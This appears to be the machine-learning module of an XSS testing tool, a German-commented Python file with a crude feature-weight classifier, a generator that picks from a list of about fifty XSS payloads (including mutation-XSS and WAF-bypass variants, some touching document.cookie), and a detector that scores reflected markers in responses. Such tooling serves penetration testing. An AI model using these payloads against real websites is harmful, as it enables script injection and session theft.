#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
XSS Hunter Pro Framework - ML Module
====================================

Dieses Modul enthält Funktionen für maschinelles Lernen im XSS Hunter Pro Framework.

Autor: Anonymous
Lizenz: MIT
Version: 0.3.0
"""

import os
import sys
import re
import json
import logging
import random
import string
import time
import numpy as np
from typing import Dict, List, Optional, Any, Tuple, Union, Set

# Füge das Hauptverzeichnis zum Pfad hinzu, um Module zu importieren
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

try:
    from utils import load_json_file, save_json_file, create_directory
except ImportError:
    # Einfache Implementierungen, falls die Module nicht importiert werden können
    def load_json_file(file_path):
        try:
            if not os.path.exists(file_path):
                print(f"Datei nicht gefunden: {file_path}")
                return None
            
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            print(f"Fehler beim Laden der JSON-Datei {file_path}: {e}")
            return None
            
    def save_json_file(file_path, data):
        try:
            directory = os.path.dirname(file_path)
            if directory and not os.path.exists(directory):
                os.makedirs(directory, exist_ok=True)
                
            with open(file_path, 'w', encoding='utf-8') as f:
                json.dump(data, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            print(f"Fehler beim Speichern der JSON-Datei {file_path}: {e}")
            return False
            
    def create_directory(directory_path):
        os.makedirs(directory_path, exist_ok=True)
        return True

# Konfiguriere Logging
logger = logging.getLogger("XSSHunterPro.MLModule")

class SimpleMLModel:
    """
    Eine einfache Implementierung eines ML-Modells für XSS-Erkennung.
    """
    
    def __init__(self, config=None):
        """
        Initialisiert das ML-Modell.
        
        Args:
            config: Die Konfiguration für das Modell.
        """
        self.config = config or {}
        self.model_file = self.config.get("model_file", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "ml_model.json"))
        self.features = self.config.get("features", ["length", "special_chars", "javascript_functions", "html_tags", "event_handlers", "encoding"])
        self.model = self._load_model()
        
    def _load_model(self):
        """
        Lädt das ML-Modell aus einer Datei.
        
        Returns:
            Das geladene Modell oder ein Standardmodell, wenn die Datei nicht geladen werden kann.
        """
        # Standardmodell, falls die Datei nicht geladen werden kann
        default_model = {
            "weights": {
                "length": 0.1,
                "special_chars": 0.2,
                "javascript_functions": 0.3,
                "html_tags": 0.2,
                "event_handlers": 0.3,
                "encoding": 0.1
            },
            "thresholds": {
                "xss_probability": 0.6
            }
        }
        
        # Versuche, das Modell aus der Datei zu laden
        if os.path.exists(self.model_file):
            try:
                model = load_json_file(self.model_file)
                if model:
                    return model
            except Exception as e:
                logger.error(f"Fehler beim Laden des ML-Modells: {e}")
        
        # Verwende Standardmodell, wenn die Datei nicht geladen werden kann
        return default_model
        
    def predict(self, payload):
        """
        Führt eine Vorhersage für einen Payload durch.
        
        Args:
            payload: Der zu bewertende Payload.
            
        Returns:
            Ein Dictionary mit der Vorhersage.
        """
        # Extrahiere Features aus dem Payload
        features = self._extract_features(payload)
        
        # Berechne die Wahrscheinlichkeit für XSS
        xss_probability = 0.0
        for feature, value in features.items():
            if feature in self.model["weights"]:
                xss_probability += value * self.model["weights"][feature]
                
        # Normalisiere die Wahrscheinlichkeit
        xss_probability = min(max(xss_probability, 0.0), 1.0)
        
        # Bestimme, ob es sich um XSS handelt
        is_xss = xss_probability >= self.model["thresholds"]["xss_probability"]
        
        return {
            "is_xss": is_xss,
            "probability": xss_probability,
            "features": features
        }
        
    def _extract_features(self, payload):
        """
        Extrahiert Features aus einem Payload.
        
        Args:
            payload: Der Payload.
            
        Returns:
            Ein Dictionary mit den extrahierten Features.
        """
        features = {}
        
        # Länge des Payloads (normalisiert)
        features["length"] = min(len(payload) / 100.0, 1.0)
        
        # Anzahl der Sonderzeichen (normalisiert)
        special_chars = sum(1 for c in payload if c in "<>\"'&;(){}[]")
        features["special_chars"] = min(special_chars / 10.0, 1.0)
        
        # Vorhandensein von JavaScript-Funktionen
        js_functions = ["alert", "confirm", "prompt", "eval", "setTimeout", "setInterval", "document", "window", "console"]
        js_count = sum(1 for func in js_functions if func in payload.lower())
        features["javascript_functions"] = min(js_count / len(js_functions), 1.0)
        
        # Vorhandensein von HTML-Tags
        html_tags = ["script", "img", "iframe", "svg", "body", "input", "form", "object", "embed", "link"]
        tag_pattern = r"<\s*([a-zA-Z]+)"
        tag_matches = re.findall(tag_pattern, payload.lower())
        tag_count = sum(1 for tag in tag_matches if tag in html_tags)
        features["html_tags"] = min(tag_count / len(html_tags), 1.0)
        
        # Vorhandensein von Event-Handlern
        event_handlers = ["onload", "onerror", "onclick", "onmouseover", "onfocus", "onblur", "onkeypress", "onsubmit", "onmouseout", "onunload"]
        handler_count = sum(1 for handler in event_handlers if handler in payload.lower())
        features["event_handlers"] = min(handler_count / len(event_handlers), 1.0)
        
        # Vorhandensein von Encoding
        encoding_patterns = [r"%[0-9a-fA-F]{2}", r"&#[0-9]+;", r"&#x[0-9a-fA-F]+;", r"\\u[0-9a-fA-F]{4}", r"\\x[0-9a-fA-F]{2}"]
        encoding_count = sum(len(re.findall(pattern, payload)) for pattern in encoding_patterns)
        features["encoding"] = min(encoding_count / 5.0, 1.0)
        
        return features

class PayloadGenerator:
    """
    Klasse zur Generierung von XSS-Payloads.
    """
    
    def __init__(self, config=None):
        """
        Initialisiert den Payload-Generator.
        
        Args:
            config: Die Konfiguration für den Generator.
        """
        self.config = config or {}
        self.payloads_file = self.config.get("payloads_file", os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "xss_payloads.json"))
        self.payloads = self._load_payloads()
        self.ml_model = SimpleMLModel(self.config.get("ml_model_config"))
        
    def _load_payloads(self):
        """
        Lädt die XSS-Payloads aus einer Datei.
        
        Returns:
            Die geladenen Payloads oder Standard-Payloads, wenn die Datei nicht geladen werden kann.
        """
        # Standard-Payloads, falls die Datei nicht geladen werden kann
        default_payloads = {
            "html": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg/onload=alert('XSS')>",
                "<iframe src=\"javascript:alert('XSS')\"></iframe>",
                "<body onload=alert('XSS')>",
                "<input autofocus onfocus=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<video src=x onerror=alert('XSS')>",
                "<audio src=x onerror=alert('XSS')>",
                "<marquee onstart=alert('XSS')>"
            ],
            "attribute": [
                "\" onmouseover=\"alert('XSS')\" \"",
                "\" onfocus=\"alert('XSS')\" autofocus \"",
                "\" onblur=\"alert('XSS')\" autofocus \"",
                "\" onclick=\"alert('XSS')\" \"",
                "\" ondblclick=\"alert('XSS')\" \"",
                "\" onkeypress=\"alert('XSS')\" \"",
                "\" onkeyup=\"alert('XSS')\" \"",
                "\" onkeydown=\"alert('XSS')\" \"",
                "\" onerror=\"alert('XSS')\" \"",
                "\" onload=\"alert('XSS')\" \""
            ],
            "javascript": [
                "alert('XSS')",
                "confirm('XSS')",
                "prompt('XSS')",
                "eval(\"alert('XSS')\")",
                "setTimeout(\"alert('XSS')\", 100)",
                "setInterval(\"alert('XSS')\", 100)",
                "document.write(\"<script>alert('XSS')</script>\")",
                "window.location='javascript:alert(\"XSS\")'",
                "console.log('XSS'); alert('XSS')",
                "(function(){alert('XSS')})()"
            ],
            "advanced": [
                "<script>eval(atob('YWxlcnQoJ1hTUycpOw=='))</script>",
                "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))>",
                "<svg><script>alert&#40;'XSS'&#41;</script>",
                "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
                "<math><mtext><table><mglyph><svg><mtext><textarea><a title=\"</textarea><img src=x onerror=alert('XSS')>\">",
                "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">",
                "<style><img src=\"</style><img src=x onerror=alert('XSS')\">",
                "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
                "<a href=\"javascript:void(0)\" onmouseover=&NewLine;javascript:alert('XSS')&NewLine;>X</a>",
                "<a href=\"javascript:void(0)\" onmouseover=javascript:alert&lpar;'XSS'&rpar;&NewLine;>X</a>"
            ],
            "bypass": [
                "<script>alert('XSS'.replace('XSS','XSS'))</script>",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "<script>alert(/XSS/.source)</script>",
                "<script>alert(decodeURIComponent('%58%53%53'))</script>",
                "<script>alert(document['cookie'])</script>",
                "<script>alert(document.cookie.substring(0,document.cookie.length))</script>",
                "<script>alert(document['location']['href'])</script>",
                "<script>alert(document.location.href.substring(0,document.location.href.length))</script>",
                "<script>alert(window['document']['cookie'])</script>",
                "<script>alert(window.document.cookie.substring(0,window.document.cookie.length))</script>"
            ]
        }
        
        # Versuche, die Payloads aus der Datei zu laden
        if os.path.exists(self.payloads_file):
            try:
                payloads = load_json_file(self.payloads_file)
                if payloads:
                    return payloads
            except Exception as e:
                logger.error(f"Fehler beim Laden der XSS-Payloads: {e}")
        
        # Verwende Standard-Payloads, wenn die Datei nicht geladen werden kann
        return default_payloads
        
    def generate_payload(self, context="html", complexity=1, marker="XSS"):
        """
        Generiert einen XSS-Payload.
        
        Args:
            context: Der Kontext des Payloads (html, attribute, javascript, advanced, bypass).
            complexity: Die Komplexität des Payloads (1-3).
            marker: Ein Marker, der in den Payload eingefügt wird.
            
        Returns:
            Der generierte Payload.
        """
        # Verwende "html", wenn der Kontext nicht unterstützt wird
        if context not in ["html", "attribute", "javascript", "advanced", "bypass"]:
            context = "html"
            
        # Begrenze die Komplexität auf 1-3
        complexity = max(1, min(3, complexity))
        
        # Wähle Payloads basierend auf dem Kontext
        available_payloads = self.payloads.get(context, [])
        if not available_payloads:
            # Fallback auf HTML-Payloads
            available_payloads = self.payloads.get("html", [])
            
        # Filtere Payloads basierend auf der Komplexität
        if complexity == 1:
            # Einfache Payloads (die ersten 3)
            filtered_payloads = available_payloads[:3]
        elif complexity == 2:
            # Mittlere Payloads (die mittleren 4)
            filtered_payloads = available_payloads[3:7]
        else:
            # Komplexe Payloads (die letzten 3)
            filtered_payloads = available_payloads[7:]
            
        # Wähle einen zufälligen Payload
        if filtered_payloads:
            payload = random.choice(filtered_payloads)
        else:
            # Fallback auf einen einfachen Payload
            payload = "<script>alert('XSS')</script>"
            
        # Ersetze 'XSS' durch den Marker
        payload = payload.replace("'XSS'", f"'{marker}'")
        payload = payload.replace("\"XSS\"", f"\"{marker}\"")
        
        return payload
        
    def generate_payloads(self, context="html", complexity=1, marker="XSS", count=10):
        """
        Generiert mehrere XSS-Payloads.
        
        Args:
            context: Der Kontext der Payloads (html, attribute, javascript, advanced, bypass).
            complexity: Die Komplexität der Payloads (1-3).
            marker: Ein Marker, der in die Payloads eingefügt wird.
            count: Die Anzahl der zu generierenden Payloads.
            
        Returns:
            Eine Liste der generierten Payloads.
        """
        payloads = []
        for _ in range(count):
            payload = self.generate_payload(context, complexity, marker)
            payloads.append(payload)
            
        return payloads
        
    def generate_smart_payload(self, context="html", marker="XSS", target_url=None, waf_type=None):
        """
        Generiert einen intelligenten XSS-Payload basierend auf dem Kontext und dem Ziel.
        
        Args:
            context: Der Kontext des Payloads (html, attribute, javascript, advanced, bypass).
            marker: Ein Marker, der in den Payload eingefügt wird.
            target_url: Die Ziel-URL (optional).
            waf_type: Der Typ der WAF (optional).
            
        Returns:
            Der generierte Payload.
        """
        # Generiere mehrere Payloads mit unterschiedlicher Komplexität
        payloads = []
        for complexity in range(1, 4):
            for _ in range(3):  # Generiere 3 Payloads pro Komplexitätsstufe
                payload = self.generate_payload(context, complexity, marker)
                payloads.append(payload)
                
        # Wenn eine WAF angegeben ist, füge Bypass-Payloads hinzu
        if waf_type:
            for _ in range(5):  # Generiere 5 Bypass-Payloads
                payload = self.generate_payload("bypass", 3, marker)
                payloads.append(payload)
                
        # Bewerte die Payloads mit dem ML-Modell
        scored_payloads = []
        for payload in payloads:
            prediction = self.ml_model.predict(payload)
            scored_payloads.append((payload, prediction["probability"]))
            
        # Sortiere die Payloads nach ihrer Wahrscheinlichkeit (absteigend)
        scored_payloads.sort(key=lambda x: x[1], reverse=True)
        
        # Wähle den besten Payload
        if scored_payloads:
            return scored_payloads[0][0]
        else:
            # Fallback auf einen einfachen Payload
            return f"<script>alert('{marker}')</script>"

class MLXSSDetector:
    """
    Klasse zur Erkennung von XSS-Schwachstellen mit maschinellem Lernen.
    """
    
    def __init__(self, config=None):
        """
        Initialisiert den XSS-Detektor.
        
        Args:
            config: Die Konfiguration für den Detektor.
        """
        self.config = config or {}
        self.ml_model = SimpleMLModel(self.config.get("ml_model_config"))
        self.payload_generator = PayloadGenerator(self.config)
        self.threshold = self.config.get("threshold", 0.6)
        
    def analyze_response(self, response_text, payload, marker):
        """
        Analysiert eine HTTP-Antwort auf XSS-Schwachstellen.
        
        Args:
            response_text: Der Text der HTTP-Antwort.
            payload: Der verwendete Payload.
            marker: Der Marker im Payload.
            
        Returns:
            Ein Dictionary mit den Analyseergebnissen.
        """
        # Überprüfe, ob der Marker in der Antwort enthalten ist
        marker_found = marker in response_text
        
        # Extrahiere den Kontext des Markers
        context = self._determine_context(response_text, marker) if marker_found else None
        
        # Bewerte den Payload mit dem ML-Modell
        prediction = self.ml_model.predict(payload)
        
        # Bestimme, ob es sich um eine XSS-Schwachstelle handelt
        is_xss = marker_found and prediction["probability"] >= self.threshold
        
        # Bestimme den Schweregrad
        severity = self._determine_severity(prediction["probability"], context)
        
        return {
            "is_xss": is_xss,
            "probability": prediction["probability"],
            "marker_found": marker_found,
            "context": context,
            "severity": severity,
            "features": prediction["features"]
        }
        
    def _determine_context(self, html_content, marker):
        """
        Bestimmt den Kontext eines Markers in HTML-Inhalt.
        
        Args:
            html_content: Der HTML-Inhalt.
            marker: Der Marker.
            
        Returns:
            Der Kontext des Markers oder None, wenn der Kontext nicht bestimmt werden kann.
        """
        # Suche nach dem Marker im HTML-Inhalt
        marker_index = html_content.find(marker)
        if marker_index == -1:
            return None
            
        # Extrahiere einen Teil des HTML-Inhalts um den Marker herum
        start_index = max(0, marker_index - 100)
        end_index = min(len(html_content), marker_index + 100 + len(marker))
        context_html = html_content[start_index:end_index]
        
        # Überprüfe, ob der Marker in einem Script-Tag ist
        script_pattern = r"<script[^>]*>(.*?)</script>"
        script_matches = re.finditer(script_pattern, context_html, re.DOTALL)
        for match in script_matches:
            if marker in match.group(1):
                return "javascript"
                
        # Überprüfe, ob der Marker in einem Event-Handler ist
        event_pattern = r"on\w+\s*=\s*['\"]([^'\"]*?)" + re.escape(marker) + r"([^'\"]*?)['\"]"
        event_match = re.search(event_pattern, context_html)
        if event_match:
            return "event_handler"
            
        # Überprüfe, ob der Marker in einem Attribut ist
        attr_pattern = r"<[^>]+\s+\w+\s*=\s*['\"]([^'\"]*?)" + re.escape(marker) + r"([^'\"]*?)['\"]"
        attr_match = re.search(attr_pattern, context_html)
        if attr_match:
            return "attribute"
            
        # Überprüfe, ob der Marker in einem HTML-Tag ist
        tag_pattern = r"<([^>]*?)" + re.escape(marker) + r"([^>]*?)>"
        tag_match = re.search(tag_pattern, context_html)
        if tag_match:
            return "tag"
            
        # Überprüfe, ob der Marker im HTML-Text ist
        text_pattern = r">([^<]*?)" + re.escape(marker) + r"([^<]*?)<"
        text_match = re.search(text_pattern, context_html)
        if text_match:
            return "text"
            
        # Überprüfe, ob der Marker in einem Kommentar ist
        comment_pattern = r"<!--(.*?)" + re.escape(marker) + r"(.*?)-->"
        comment_match = re.search(comment_pattern, context_html)
        if comment_match:
            return "comment"
            
        # Überprüfe, ob der Marker in einem Style-Tag ist
        style_pattern = r"<style[^>]*>(.*?)</style>"
        style_matches = re.finditer(style_pattern, context_html, re.DOTALL)
        for match in style_matches:
            if marker in match.group(1):
                return "css"
                
        # Wenn kein spezifischer Kontext gefunden wurde, aber der Marker im HTML ist
        if marker in context_html:
            return "unknown"
            
        return None
        
    def _determine_severity(self, probability, context):
        """
        Bestimmt den Schweregrad einer XSS-Schwachstelle.
        
        Args:
            probability: Die Wahrscheinlichkeit für XSS.
            context: Der Kontext des XSS.
            
        Returns:
            Der Schweregrad der Schwachstelle.
        """
        # Basiswert basierend auf der Wahrscheinlichkeit
        if probability >= 0.9:
            base_severity = "CRITICAL"
        elif probability >= 0.7:
            base_severity = "HIGH"
        elif probability >= 0.5:
            base_severity = "MEDIUM"
        else:
            base_severity = "LOW"
            
        # Anpassung basierend auf dem Kontext
        if context in ["javascript", "event_handler"]:
            # JavaScript und Event-Handler sind besonders gefährlich
            if base_severity == "MEDIUM":
                return "HIGH"
            elif base_severity == "LOW":
                return "MEDIUM"
        elif context in ["attribute", "tag"]:
            # Attribute und Tags sind potenziell gefährlich
            if base_severity == "LOW":
                return "MEDIUM"
        elif context in ["text", "comment", "css"]:
            # Text, Kommentare und CSS sind weniger gefährlich
            if base_severity == "HIGH":
                return "MEDIUM"
            elif base_severity == "MEDIUM":
                return "LOW"
                
        return base_severity
        
    def generate_smart_payloads(self, context="html", marker="XSS", count=10, target_url=None, waf_type=None):
        """
        Generiert intelligente XSS-Payloads.
        
        Args:
            context: Der Kontext der Payloads (html, attribute, javascript, advanced, bypass).
            marker: Ein Marker, der in die Payloads eingefügt wird.
            count: Die Anzahl der zu generierenden Payloads.
            target_url: Die Ziel-URL (optional).
            waf_type: Der Typ der WAF (optional).
            
        Returns:
            Eine Liste der generierten Payloads.
        """
        payloads = []
        for _ in range(count):
            payload = self.payload_generator.generate_smart_payload(context, marker, target_url, waf_type)
            payloads.append(payload)
            
        return payloads
